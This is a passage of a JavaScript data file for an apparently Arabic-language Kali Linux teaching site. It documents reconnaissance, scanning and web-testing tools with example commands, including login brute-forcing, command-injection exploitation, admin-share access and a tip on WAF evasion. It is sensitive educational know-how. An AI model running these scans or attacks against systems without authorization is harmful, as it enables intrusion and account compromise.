// ============================================================
// KALI ACADEMY - COMMANDS DATABASE PART 14
// 80 NEW UNIQUE COMMANDS - IDs 1351-1430
// ============================================================
window.CMD_PART14 = [
  {
    id: 1351,
    name: 'traceroute',
    cat: 'network',
    level: 'beginner',
    syntax: 'traceroute [options] <host>',
    short: 'تتبع مسار الحزم عبر الشبكة',
    desc: 'يعرض المسار الذي تسلكه الحزم للوصول إلى هدف معين عبر الإنترنت أو الشبكة المحلية، مفيد لتشخيص مشاكل الشبكة.',
    options: [
      { flag: '-n', desc: 'عرض العناوين بشكل رقمي بدون تحليل DNS' },
      { flag: '-w <ثوانٍ>', desc: 'تحديد وقت الانتظار لكل رد' },
      { flag: '-m <عدد>', desc: 'أقصى عدد من القفزات (افتراضي 30)' },
      { flag: '-I', desc: 'استخدام ICMP بدلاً من UDP' },
      { flag: '-T', desc: 'استخدام TCP SYN' }
    ],
    examples: [
      { cmd: 'traceroute google.com', desc: 'تتبع المسار إلى google.com' },
      { cmd: 'traceroute -n 8.8.8.8', desc: 'تتبع مع عرض IP فقط' },
      { cmd: 'traceroute -I 192.168.1.1', desc: 'تتبع باستخدام ICMP' }
    ],
    tips: 'استخدم traceroute لاكتشاف أين تنقطع الاتصالات في الشبكة.',
    related: ['ping', 'mtr', 'nmap']
  },
  {
    id: 1352,
    name: 'mtr',
    cat: 'network',
    level: 'beginner',
    syntax: 'mtr [options] <host>',
    short: 'أداة تشخيص الشبكة المتقدمة (traceroute + ping)',
    desc: 'تجمع بين وظائف traceroute وping في أداة واحدة تفاعلية، تعرض إحصائيات الزمن وفقدان الحزم لكل قفزة.',
    options: [
      { flag: '--report', desc: 'تشغيل في وضع التقرير' },
      { flag: '-n', desc: 'عدم تحليل أسماء DNS' },
      { flag: '-c <عدد>', desc: 'تحديد عدد الحزم المرسلة' },
      { flag: '--tcp', desc: 'استخدام TCP بدلاً من ICMP' }
    ],
    examples: [
      { cmd: 'mtr google.com', desc: 'فتح واجهة mtr التفاعلية' },
      { cmd: 'mtr --report -c 100 8.8.8.8', desc: 'إنشاء تقرير كامل' }
    ],
    tips: 'mtr هي الأفضل لتشخيص مشاكل الشبكة في الوقت الفعلي.',
    related: ['traceroute', 'ping', 'netstat']
  },
  {
    id: 1353,
    name: 'ss',
    cat: 'network',
    level: 'beginner',
    syntax: 'ss [options]',
    short: 'عرض معلومات Socket والاتصالات الشبكية',
    desc: 'بديل حديث وأسرع من netstat لعرض معلومات المنافذ والاتصالات النشطة.',
    options: [
      { flag: '-t', desc: 'عرض اتصالات TCP فقط' },
      { flag: '-u', desc: 'عرض اتصالات UDP' },
      { flag: '-l', desc: 'عرض المنافذ المستمعة فقط' },
      { flag: '-p', desc: 'عرض اسم العملية المرتبطة' },
      { flag: '-n', desc: 'عرض الأرقام بدلاً من الأسماء' }
    ],
    examples: [
      { cmd: 'ss -tlnp', desc: 'عرض TCP listening مع العمليات' },
      { cmd: 'ss -s', desc: 'عرض ملخص الإحصائيات' },
      { cmd: 'ss -tulnp', desc: 'عرض TCP و UDP listening' }
    ],
    tips: 'ss أسرع من netstat ويوصى باستخدامه في الأنظمة الحديثة.',
    related: ['netstat', 'lsof', 'nmap']
  },
  {
    id: 1354,
    name: 'arp-scan',
    cat: 'network',
    level: 'beginner',
    syntax: 'arp-scan [options] <target>',
    short: 'مسح الشبكة المحلية باستخدام ARP',
    desc: 'أداة فعالة لاكتشاف الأجهزة على الشبكة المحلية باستخدام بروتوكول ARP، تعمل حتى مع جدران الحماية.',
    options: [
      { flag: '--localnet', desc: 'مسح الشبكة المحلية كاملة' },
      { flag: '-I <واجهة>', desc: 'تحديد واجهة الشبكة' },
      { flag: '--retry <عدد>', desc: 'عدد مرات إعادة المحاولة' }
    ],
    examples: [
      { cmd: 'arp-scan --localnet', desc: 'مسح الشبكة المحلية' },
      { cmd: 'arp-scan -I eth0 192.168.1.0/24', desc: 'مسح شبكة محددة' }
    ],
    tips: 'arp-scan أسرع من nmap في الشبكات المحلية لأنه يعمل على مستوى Layer 2.',
    related: ['nmap', 'netdiscover', 'fping']
  },
  {
    id: 1355,
    name: 'fping',
    cat: 'network',
    level: 'beginner',
    syntax: 'fping [options] <hosts>',
    short: 'ping متعدد الأهداف بشكل متوازي',
    desc: 'أداة ping محسّنة تتيح إرسال ping لعدد كبير من الأجهزة في وقت واحد بكفاءة عالية.',
    options: [
      { flag: '-a', desc: 'عرض الأجهزة النشطة فقط' },
      { flag: '-g <range>', desc: 'توليد قائمة عناوين IP من نطاق' },
      { flag: '-c <عدد>', desc: 'عدد الحزم لكل هدف' },
      { flag: '-q', desc: 'وضع الهدوء - ملخص فقط' }
    ],
    examples: [
      { cmd: 'fping -a -g 192.168.1.0/24', desc: 'مسح كل الشبكة المحلية' },
      { cmd: 'fping -a -g 10.0.0.1 10.0.0.254', desc: 'مسح نطاق IP محدد' }
    ],
    tips: 'استخدم fping مع -a لاكتشاف الأجهزة الحية بسرعة.',
    related: ['ping', 'nmap', 'arp-scan']
  },
  {
    id: 1356,
    name: 'dnsenum',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'dnsenum [options] <domain>',
    short: 'تعداد DNS الشامل للنطاقات',
    desc: 'أداة متعددة الوظائف لتعداد معلومات DNS، تشمل استخراج السجلات، محاولة zone transfer، وتعداد النطاقات الفرعية.',
    options: [
      { flag: '--dnsserver <server>', desc: 'تحديد خادم DNS مخصص' },
      { flag: '-f <wordlist>', desc: 'استخدام قائمة كلمات للنطاقات الفرعية' },
      { flag: '--threads <عدد>', desc: 'عدد الخيوط المتوازية' },
      { flag: '--noreverse', desc: 'تجاوز البحث العكسي' }
    ],
    examples: [
      { cmd: 'dnsenum example.com', desc: 'تعداد DNS أساسي' },
      { cmd: 'dnsenum --dnsserver 8.8.8.8 example.com', desc: 'تعداد مع DNS مخصص' },
      { cmd: 'dnsenum -f /usr/share/wordlists/subdomains.txt example.com', desc: 'تعداد مع قائمة كلمات' }
    ],
    tips: 'dnsenum يمكنه اكتشاف نطاقات فرعية مخفية غير معروفة.',
    related: ['fierce', 'dnsrecon', 'dig', 'host']
  },
  {
    id: 1357,
    name: 'dnsrecon',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'dnsrecon -d <domain> [options]',
    short: 'استطلاع DNS متقدم ومتعدد الوظائف',
    desc: 'أداة Python قوية لاستطلاع DNS تدعم أنواعاً متعددة من الاستعلامات والتعداد.',
    options: [
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-t <type>', desc: 'نوع الفحص (std, brt, axfr, rvl)' },
      { flag: '-D <wordlist>', desc: 'قائمة كلمات للنطاقات الفرعية' },
      { flag: '-x <xml>', desc: 'حفظ النتائج في XML' }
    ],
    examples: [
      { cmd: 'dnsrecon -d example.com', desc: 'فحص DNS قياسي' },
      { cmd: 'dnsrecon -d example.com -t axfr', desc: 'محاولة zone transfer' },
      { cmd: 'dnsrecon -d example.com -t brt -D /usr/share/wordlists/dns.txt', desc: 'تعداد بالقوة' }
    ],
    tips: 'استخدم -t axfr لاختبار إمكانية zone transfer الذي يكشف كل السجلات.',
    related: ['dnsenum', 'fierce', 'dig']
  },
  {
    id: 1358,
    name: 'fierce',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'fierce --domain <domain> [options]',
    short: 'اكتشاف النطاقات الفرعية والشبكات',
    desc: 'أداة استطلاع DNS تركز على اكتشاف مساحات IP وأسماء الأجهزة المرتبطة بنطاق معين.',
    options: [
      { flag: '--domain <domain>', desc: 'النطاق المستهدف' },
      { flag: '--subdomains <wordlist>', desc: 'قائمة النطاقات الفرعية' },
      { flag: '--threads <عدد>', desc: 'عدد الخيوط' }
    ],
    examples: [
      { cmd: 'fierce --domain example.com', desc: 'بحث أساسي عن النطاق' },
      { cmd: 'fierce --domain example.com --subdomains /usr/share/wordlists/fierce.txt', desc: 'مع قائمة كلمات' }
    ],
    tips: 'fierce تتميز بالبحث عن نطاقات IP المجاورة وليس فقط DNS.',
    related: ['dnsenum', 'dnsrecon', 'amass']
  },
  {
    id: 1359,
    name: 'amass',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'amass enum -d <domain>',
    short: 'تعداد نطاقات فرعية شامل ومتقدم',
    desc: 'أداة OWASP قوية لاكتشاف الأصول الرقمية وتعداد النطاقات الفرعية من مصادر متعددة.',
    options: [
      { flag: 'enum', desc: 'وضع التعداد' },
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-passive', desc: 'الاستطلاع السلبي فقط' },
      { flag: '-o <file>', desc: 'حفظ النتائج في ملف' }
    ],
    examples: [
      { cmd: 'amass enum -d example.com', desc: 'تعداد شامل للنطاق' },
      { cmd: 'amass enum -passive -d example.com', desc: 'استطلاع سلبي فقط' }
    ],
    tips: 'amass يستخدم عشرات المصادر العامة ويعتبر الأشمل في تعداد النطاقات الفرعية.',
    related: ['subfinder', 'fierce', 'dnsenum']
  },
  {
    id: 1360,
    name: 'subfinder',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'subfinder -d <domain>',
    short: 'اكتشاف النطاقات الفرعية السلبي',
    desc: 'أداة Go سريعة لاكتشاف النطاقات الفرعية باستخدام مصادر سلبية متعددة.',
    options: [
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-o <file>', desc: 'ملف الإخراج' },
      { flag: '-t <عدد>', desc: 'عدد الخيوط المتوازية' },
      { flag: '-silent', desc: 'إخراج الأسماء فقط' }
    ],
    examples: [
      { cmd: 'subfinder -d example.com', desc: 'اكتشاف النطاقات الفرعية' },
      { cmd: 'subfinder -d example.com -o subs.txt', desc: 'حفظ النتائج في ملف' }
    ],
    tips: 'subfinder أسرع من amass لكن amass أشمل - استخدم كليهما.',
    related: ['amass', 'dnsenum', 'fierce']
  },
  {
    id: 1361,
    name: 'masscan',
    cat: 'network',
    level: 'intermediate',
    syntax: 'masscan <target> -p <ports> [options]',
    short: 'أسرع ماسح منافذ في العالم',
    desc: 'أداة مسح المنافذ الأسرع على الإطلاق، قادرة على مسح الإنترنت كله في دقائق، تُستخدم للمسح السريع للشبكات الكبيرة.',
    options: [
      { flag: '-p <ports>', desc: 'المنافذ المستهدفة (مثال: 80,443 أو 1-1000)' },
      { flag: '--rate <عدد>', desc: 'معدل الحزم في الثانية' },
      { flag: '-oG <file>', desc: 'حفظ النتائج بصيغة Grepable' },
      { flag: '--banners', desc: 'جمع بيانات البانر' }
    ],
    examples: [
      { cmd: 'masscan 192.168.1.0/24 -p 80,443', desc: 'مسح المنفذين 80 و443' },
      { cmd: 'masscan 10.0.0.0/8 -p 0-65535 --rate 100000', desc: 'مسح سريع لشبكة كاملة' }
    ],
    tips: 'قلل معدل الإرسال --rate في الشبكات الداخلية لتجنب الإغراق.',
    related: ['nmap', 'zmap', 'unicornscan']
  },
  {
    id: 1362,
    name: 'zmap',
    cat: 'network',
    level: 'advanced',
    syntax: 'zmap -p <port> [options] <target>',
    short: 'مسح شبكات واسعة النطاق بسرعة فائقة',
    desc: 'ماسح شبكي عالي السرعة مصمم لمسح الإنترنت بأكمله على منفذ واحد في دقائق.',
    options: [
      { flag: '-p <port>', desc: 'المنفذ المستهدف' },
      { flag: '-o <file>', desc: 'ملف الإخراج' },
      { flag: '-r <rate>', desc: 'معدل الإرسال' },
      { flag: '-B <bandwidth>', desc: 'تحديد عرض النطاق' }
    ],
    examples: [
      { cmd: 'zmap -p 443 192.168.0.0/16', desc: 'مسح HTTPS على شبكة' },
      { cmd: 'zmap -p 22 -o ssh_hosts.txt 10.0.0.0/8', desc: 'إيجاد خوادم SSH' }
    ],
    tips: 'استخدم zmap بحذر - معدل الإرسال العالي قد يسبب مشاكل في الشبكة.',
    related: ['masscan', 'nmap', 'masscan']
  },
  {
    id: 1363,
    name: 'gobuster',
    cat: 'web',
    level: 'intermediate',
    syntax: 'gobuster [mode] -u <url> -w <wordlist>',
    short: 'اكتشاف المسارات والنطاقات الفرعية بالقوة',
    desc: 'أداة Go سريعة لاكتشاف الملفات والمجلدات والنطاقات الفرعية المخفية على خوادم الويب.',
    options: [
      { flag: 'dir', desc: 'وضع اكتشاف المسارات' },
      { flag: 'dns', desc: 'وضع اكتشاف النطاقات الفرعية' },
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-w <wordlist>', desc: 'قائمة الكلمات' },
      { flag: '-x <ext>', desc: 'امتدادات الملفات للبحث' },
      { flag: '-t <عدد>', desc: 'عدد الخيوط المتوازية' }
    ],
    examples: [
      { cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', desc: 'مسح المسارات الشائعة' },
      { cmd: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt', desc: 'مسح مع امتدادات محددة' },
      { cmd: 'gobuster dns -d target.com -w subdomains.txt', desc: 'تعداد النطاقات الفرعية' }
    ],
    tips: 'استخدم قائمة /usr/share/seclists/Discovery/Web-Content للحصول على نتائج شاملة.',
    related: ['dirb', 'dirsearch', 'feroxbuster']
  },
  {
    id: 1364,
    name: 'feroxbuster',
    cat: 'web',
    level: 'intermediate',
    syntax: 'feroxbuster -u <url> -w <wordlist>',
    short: 'مسح مسارات الويب بشكل متكرر وسريع',
    desc: 'أداة Rust سريعة جداً لمسح مسارات الويب بشكل تكراري (recursive) تلقائياً.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-w <wordlist>', desc: 'قائمة الكلمات' },
      { flag: '--depth <عدد>', desc: 'عمق المسح التكراري' },
      { flag: '-x <ext>', desc: 'امتدادات للبحث' },
      { flag: '--filter-status <codes>', desc: 'تصفية أكواد HTTP' }
    ],
    examples: [
      { cmd: 'feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt', desc: 'مسح شامل' },
      { cmd: 'feroxbuster -u http://target.com --depth 3 -x php,aspx', desc: 'مسح تكراري عميق' }
    ],
    tips: 'feroxbuster أسرع من gobuster في المسح التكراري بفضل Rust.',
    related: ['gobuster', 'dirb', 'dirsearch']
  },
  {
    id: 1365,
    name: 'dirsearch',
    cat: 'web',
    level: 'beginner',
    syntax: 'dirsearch -u <url> [options]',
    short: 'مسح المسارات والملفات على خوادم الويب',
    desc: 'أداة Python لاكتشاف المسارات والملفات المخفية على خوادم الويب.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-e <ext>', desc: 'امتدادات الملفات' },
      { flag: '-w <wordlist>', desc: 'قائمة كلمات مخصصة' },
      { flag: '--exclude-status <codes>', desc: 'استبعاد أكواد HTTP' }
    ],
    examples: [
      { cmd: 'dirsearch -u http://target.com', desc: 'مسح أساسي' },
      { cmd: 'dirsearch -u http://target.com -e php,html', desc: 'مسح مع امتدادات محددة' }
    ],
    tips: 'dirsearch سهل الاستخدام ومناسب للمبتدئين في اختبار الويب.',
    related: ['gobuster', 'feroxbuster', 'dirb']
  },
  {
    id: 1366,
    name: 'ffuf',
    cat: 'web',
    level: 'intermediate',
    syntax: 'ffuf -u <url/FUZZ> -w <wordlist>',
    short: 'أداة fuzzing ويب سريعة ومتعددة الاستخدامات',
    desc: 'أداة web fuzzing سريعة تُستخدم لاكتشاف المسارات والمعاملات والنطاقات الفرعية وغيرها باستخدام كلمة FUZZ.',
    options: [
      { flag: '-u <url>', desc: 'الرابط مع FUZZ كمكان الحقن' },
      { flag: '-w <wordlist>', desc: 'قائمة الكلمات' },
      { flag: '-H <header>', desc: 'إضافة ترويسة HTTP' },
      { flag: '-mc <codes>', desc: 'فلترة حسب كود HTTP' },
      { flag: '-fc <codes>', desc: 'استبعاد أكواد HTTP' },
      { flag: '-t <عدد>', desc: 'عدد الخيوط' }
    ],
    examples: [
      { cmd: 'ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt', desc: 'مسح المسارات' },
      { cmd: 'ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt', desc: 'اكتشاف Virtual Hosts' },
      { cmd: 'ffuf -u http://target.com/api?param=FUZZ -w params.txt', desc: 'fuzzing معاملات GET' }
    ],
    tips: 'ffuf مرن جداً - يمكن وضع FUZZ في أي مكان في الطلب.',
    related: ['gobuster', 'wfuzz', 'burpsuite']
  },
  {
    id: 1367,
    name: 'wfuzz',
    cat: 'web',
    level: 'intermediate',
    syntax: 'wfuzz -w <wordlist> <url>',
    short: 'أداة web fuzzing متقدمة',
    desc: 'أداة fuzzing قوية لتطبيقات الويب تدعم fuzzing معقد في أي جزء من الطلب HTTP.',
    options: [
      { flag: '-w <wordlist>', desc: 'قائمة الكلمات' },
      { flag: '-d <data>', desc: 'بيانات POST' },
      { flag: '--hc <codes>', desc: 'إخفاء نتائج بكود HTTP معين' },
      { flag: '-H <header>', desc: 'إضافة ترويسة' }
    ],
    examples: [
      { cmd: 'wfuzz -w wordlist.txt http://target.com/FUZZ', desc: 'fuzzing مسارات' },
      { cmd: 'wfuzz -w users.txt -w passwords.txt --hc 200 -d "user=FUZZ&pass=FUZ2Z" http://target.com/login', desc: 'fuzzing نموذج تسجيل الدخول' }
    ],
    tips: 'wfuzz يدعم FUZ2Z و FUZ3Z لاستخدام قوائم كلمات متعددة.',
    related: ['ffuf', 'gobuster', 'hydra']
  },
  {
    id: 1368,
    name: 'commix',
    cat: 'web',
    level: 'advanced',
    syntax: 'commix -u <url> [options]',
    short: 'اكتشاف وإستغلال ثغرات حقن الأوامر',
    desc: 'أداة آلية لاكتشاف واستغلال ثغرات Command Injection في تطبيقات الويب.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '--data <data>', desc: 'بيانات POST' },
      { flag: '--cookie <cookie>', desc: 'ملفات تعريف الارتباط' },
      { flag: '--os-cmd <cmd>', desc: 'تنفيذ أمر نظام مباشرة' }
    ],
    examples: [
      { cmd: 'commix -u "http://target.com/app.php?ip=INJECT_HERE"', desc: 'فحص command injection' },
      { cmd: 'commix -u http://target.com/login --data "user=admin&pass=test"', desc: 'فحص POST data' }
    ],
    tips: 'commix يتعامل مع أنواع متعددة من Command Injection: classic, time-based, file-based.',
    related: ['sqlmap', 'burpsuite', 'metasploit']
  },
  {
    id: 1369,
    name: 'xsser',
    cat: 'web',
    level: 'intermediate',
    syntax: 'xsser -u <url> [options]',
    short: 'اكتشاف وإستغلال ثغرات XSS',
    desc: 'إطار عمل متخصص في اكتشاف واستغلال ثغرات Cross-Site Scripting (XSS).',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-g <url>', desc: 'فحص معاملات GET' },
      { flag: '-p <data>', desc: 'فحص بيانات POST' },
      { flag: '--auto', desc: 'فحص آلي شامل' }
    ],
    examples: [
      { cmd: 'xsser -u "http://target.com/search?q=test"', desc: 'فحص XSS أساسي' },
      { cmd: 'xsser --auto -u http://target.com', desc: 'فحص آلي شامل' }
    ],
    tips: 'جرب XSS في حقول البحث ونماذج التعليقات أولاً.',
    related: ['burpsuite', 'zaproxy', 'dalfox']
  },
  {
    id: 1370,
    name: 'dalfox',
    cat: 'web',
    level: 'intermediate',
    syntax: 'dalfox url <url> [options]',
    short: 'أداة XSS scanning متقدمة وسريعة',
    desc: 'أداة Go حديثة وسريعة للكشف عن ثغرات XSS مع دعم DOM-based وReflected وStored XSS.',
    options: [
      { flag: 'url', desc: 'فحص رابط محدد' },
      { flag: 'pipe', desc: 'قراءة الروابط من stdin' },
      { flag: '--cookie <cookie>', desc: 'ملفات الارتباط للمصادقة' },
      { flag: '-o <file>', desc: 'حفظ النتائج' }
    ],
    examples: [
      { cmd: 'dalfox url "http://target.com/search?q=test"', desc: 'فحص XSS على رابط' },
      { cmd: 'cat urls.txt | dalfox pipe', desc: 'فحص قائمة روابط' }
    ],
    tips: 'dalfox أسرع وأدق من xsser في اكتشاف XSS الحديث.',
    related: ['xsser', 'burpsuite', 'nuclei']
  },
  {
    id: 1371,
    name: 'nuclei',
    cat: 'web',
    level: 'intermediate',
    syntax: 'nuclei -u <target> -t <templates>',
    short: 'ماسح ثغرات يعتمد على قوالب',
    desc: 'أداة ProjectDiscovery سريعة للكشف عن الثغرات بناءً على قوالب YAML قابلة للتخصيص.',
    options: [
      { flag: '-u <target>', desc: 'الهدف المفرد' },
      { flag: '-l <list>', desc: 'قائمة الأهداف' },
      { flag: '-t <templates>', desc: 'مسار القوالب' },
      { flag: '-tags <tags>', desc: 'تشغيل قوالب بوسوم محددة' },
      { flag: '-severity <sev>', desc: 'فلترة حسب الخطورة' }
    ],
    examples: [
      { cmd: 'nuclei -u http://target.com -t /root/nuclei-templates/', desc: 'فحص بكل القوالب' },
      { cmd: 'nuclei -u target.com -tags cve,rce', desc: 'فحص CVEs و RCE فقط' },
      { cmd: 'nuclei -l targets.txt -severity critical,high', desc: 'فحص قائمة أهداف للثغرات الخطيرة' }
    ],
    tips: 'حدّث قوالب nuclei دائماً: nuclei -update-templates',
    related: ['nessus', 'openvas', 'jaeles']
  },
  {
    id: 1372,
    name: 'whatweb',
    cat: 'recon',
    level: 'beginner',
    syntax: 'whatweb [options] <url>',
    short: 'تحديد تقنيات وأطر تطبيقات الويب',
    desc: 'أداة استطلاع تحدد تقنيات الويب المستخدمة مثل CMS, إطار العمل, خادم الويب, وإصداراتها.',
    options: [
      { flag: '-a <level>', desc: 'مستوى الهجومية (1-4)' },
      { flag: '--log-json <file>', desc: 'حفظ النتائج بتنسيق JSON' },
      { flag: '-t <threads>', desc: 'عدد الخيوط' }
    ],
    examples: [
      { cmd: 'whatweb http://target.com', desc: 'فحص تقنيات الموقع' },
      { cmd: 'whatweb -a 3 http://target.com', desc: 'فحص هجومي أعمق' }
    ],
    tips: 'ابدأ دائماً بـ whatweb لمعرفة stack الهدف قبل اختبار الويب.',
    related: ['wappalyzer', 'nikto', 'nmap']
  },
  {
    id: 1373,
    name: 'wafw00f',
    cat: 'web',
    level: 'beginner',
    syntax: 'wafw00f <url>',
    short: 'اكتشاف جدران حماية تطبيقات الويب (WAF)',
    desc: 'أداة لاكتشاف وتحديد جدران حماية تطبيقات الويب (Web Application Firewalls) التي تحمي الهدف.',
    options: [
      { flag: '-a', desc: 'اختبار كل WAFs المعروفة' },
      { flag: '-l', desc: 'سرد كل WAFs المدعومة' },
      { flag: '-o <file>', desc: 'حفظ النتائج في ملف' }
    ],
    examples: [
      { cmd: 'wafw00f http://target.com', desc: 'اكتشاف WAF' },
      { cmd: 'wafw00f -a http://target.com', desc: 'فحص شامل لكل WAFs' }
    ],
    tips: 'معرفة نوع WAF يساعدك في اختيار أسلوب التحايل المناسب.',
    related: ['whatweb', 'nikto', 'nmap']
  },
  {
    id: 1374,
    name: 'wpscan',
    cat: 'web',
    level: 'intermediate',
    syntax: 'wpscan --url <url> [options]',
    short: 'فحص أمان مواقع WordPress',
    desc: 'ماسح أمني متخصص لمواقع WordPress يكشف الثغرات والإضافات والقوالب والمستخدمين.',
    options: [
      { flag: '--url <url>', desc: 'رابط موقع WordPress' },
      { flag: '--enumerate u', desc: 'تعداد المستخدمين' },
      { flag: '--enumerate p', desc: 'تعداد الإضافات' },
      { flag: '--passwords <file>', desc: 'كشف كلمات المرور' },
      { flag: '--api-token <token>', desc: 'رمز API للثغرات المحدثة' }
    ],
    examples: [
      { cmd: 'wpscan --url http://target.com', desc: 'فحص أساسي لـ WordPress' },
      { cmd: 'wpscan --url http://target.com --enumerate u,p,t', desc: 'تعداد المستخدمين والإضافات والقوالب' },
      { cmd: 'wpscan --url http://target.com --passwords rockyou.txt', desc: 'هجوم كلمات المرور' }
    ],
    tips: 'احصل على API token مجاني من wpscan.com لبيانات الثغرات المحدثة.',
    related: ['joomscan', 'droopescan', 'nikto']
  },
  {
    id: 1375,
    name: 'joomscan',
    cat: 'web',
    level: 'intermediate',
    syntax: 'joomscan -u <url>',
    short: 'فحص أمان مواقع Joomla',
    desc: 'ماسح أمني متخصص للكشف عن ثغرات مواقع Joomla CMS.',
    options: [
      { flag: '-u <url>', desc: 'رابط موقع Joomla' },
      { flag: '--enumerate-components', desc: 'تعداد المكونات' },
      { flag: '-ec', desc: 'تعداد المكونات المثبتة' }
    ],
    examples: [
      { cmd: 'joomscan -u http://target.com', desc: 'فحص Joomla أساسي' },
      { cmd: 'joomscan -u http://target.com --enumerate-components', desc: 'تعداد المكونات' }
    ],
    tips: 'Joomla يعاني من ثغرات LFI و SQLi في المكونات القديمة.',
    related: ['wpscan', 'droopescan', 'nikto']
  },
  {
    id: 1376,
    name: 'droopescan',
    cat: 'web',
    level: 'intermediate',
    syntax: 'droopescan scan <cms> -u <url>',
    short: 'فحص أمان مواقع CMS متعددة (Drupal, SilverStripe)',
    desc: 'ماسح مدعوم بقائمة من CMS مثل Drupal وSilverStripe للكشف عن الثغرات.',
    options: [
      { flag: 'scan drupal', desc: 'مسح موقع Drupal' },
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-t <threads>', desc: 'عدد الخيوط' }
    ],
    examples: [
      { cmd: 'droopescan scan drupal -u http://target.com', desc: 'فحص موقع Drupal' },
      { cmd: 'droopescan scan silverstripe -u http://target.com', desc: 'فحص SilverStripe' }
    ],
    tips: 'Drupal بإصدارات قديمة عرضة لـ Drupalgeddon ثغرات خطيرة.',
    related: ['wpscan', 'joomscan', 'nikto']
  },
  {
    id: 1377,
    name: 'testssl',
    cat: 'web',
    level: 'intermediate',
    syntax: 'testssl.sh [options] <host>',
    short: 'فحص شامل لإعدادات SSL/TLS',
    desc: 'أداة سكريبت Bash قوية تفحص إعدادات SSL/TLS وتكشف الضعف مثل BEAST و POODLE و Heartbleed.',
    options: [
      { flag: '--full', desc: 'فحص شامل لكل الإعدادات' },
      { flag: '--vulnerable', desc: 'فحص الثغرات المعروفة فقط' },
      { flag: '--headers', desc: 'فحص Security Headers' }
    ],
    examples: [
      { cmd: 'testssl.sh target.com', desc: 'فحص SSL/TLS أساسي' },
      { cmd: 'testssl.sh --full target.com:443', desc: 'فحص شامل' }
    ],
    tips: 'testssl.sh يعمل بدون تثبيت - مجرد سكريبت bash.',
    related: ['sslscan', 'nmap', 'openssl']
  },
  {
    id: 1378,
    name: 'sslscan',
    cat: 'web',
    level: 'beginner',
    syntax: 'sslscan [options] <host>',
    short: 'فحص إعدادات SSL/TLS الأساسية',
    desc: 'يكشف إعدادات SSL/TLS المدعومة على الخادم ويبرز الإعدادات الضعيفة.',
    options: [
      { flag: '--no-failed', desc: 'عدم عرض أصفار التشفير الفاشلة' },
      { flag: '--xml <file>', desc: 'حفظ النتائج في XML' },
      { flag: '--version', desc: 'عرض الإصدار' }
    ],
    examples: [
      { cmd: 'sslscan target.com', desc: 'فحص SSL أساسي' },
      { cmd: 'sslscan --no-failed target.com:443', desc: 'عرض الناجحة فقط' }
    ],
    tips: 'ابحث عن SSLv2 وSSLv3 المعطلة وTLS 1.0 القديم.',
    related: ['testssl', 'openssl', 'nmap']
  },
  {
    id: 1379,
    name: 'enum4linux',
    cat: 'network',
    level: 'intermediate',
    syntax: 'enum4linux [options] <target>',
    short: 'تعداد معلومات Windows/Samba عبر SMB',
    desc: 'أداة لتعداد معلومات من أنظمة Windows وLinux التي تشغل Samba عبر بروتوكولات SMB/MSRPC.',
    options: [
      { flag: '-a', desc: 'تشغيل كل الفحوصات' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-U', desc: 'الحصول على قائمة المستخدمين' },
      { flag: '-S', desc: 'الحصول على قائمة المشاركات' }
    ],
    examples: [
      { cmd: 'enum4linux -a 192.168.1.100', desc: 'تعداد شامل' },
      { cmd: 'enum4linux -U 192.168.1.100', desc: 'تعداد المستخدمين فقط' }
    ],
    tips: 'enum4linux يكشف أحياناً معلومات حساسة من SMB المفتوح بدون مصادقة.',
    related: ['smbclient', 'rpcclient', 'crackmapexec']
  },
  {
    id: 1380,
    name: 'enum4linux-ng',
    cat: 'network',
    level: 'intermediate',
    syntax: 'enum4linux-ng [options] <target>',
    short: 'نسخة محسّنة من enum4linux بـ Python3',
    desc: 'إعادة كتابة كاملة لـ enum4linux بـ Python3 مع مزيد من الميزات والموثوقية.',
    options: [
      { flag: '-A', desc: 'تشغيل كل الفحوصات' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-p <pass>', desc: 'كلمة المرور' },
      { flag: '-oJ <file>', desc: 'حفظ النتائج بـ JSON' }
    ],
    examples: [
      { cmd: 'enum4linux-ng -A 192.168.1.100', desc: 'تعداد شامل' },
      { cmd: 'enum4linux-ng -A -u admin -p password 192.168.1.100', desc: 'تعداد مع مصادقة' }
    ],
    tips: 'enum4linux-ng أكثر موثوقية ودقة من enum4linux الأصلي.',
    related: ['enum4linux', 'smbclient', 'crackmapexec']
  },
  {
    id: 1381,
    name: 'smbclient',
    cat: 'network',
    level: 'beginner',
    syntax: 'smbclient //host/share [options]',
    short: 'الوصول لمشاركات SMB/Samba',
    desc: 'عميل SMB يتيح الوصول والتصفح والتنزيل من مشاركات Windows وSamba.',
    options: [
      { flag: '-N', desc: 'بدون كلمة مرور' },
      { flag: '-U <user>', desc: 'اسم المستخدم' },
      { flag: '-L <host>', desc: 'سرد المشاركات المتاحة' },
      { flag: '-p <port>', desc: 'تحديد المنفذ' }
    ],
    examples: [
      { cmd: 'smbclient -L 192.168.1.100 -N', desc: 'سرد المشاركات بدون مصادقة' },
      { cmd: 'smbclient //192.168.1.100/share -U admin', desc: 'الاتصال بمشاركة محددة' },
      { cmd: 'smbclient //192.168.1.100/C$ -U administrator', desc: 'الوصول لـ C$ (admin share)' }
    ],
    tips: 'استخدم get و put و ls بعد الاتصال لإدارة الملفات.',
    related: ['rpcclient', 'enum4linux', 'crackmapexec']
  },
  {
    id: 1382,
    name: 'rpcclient',
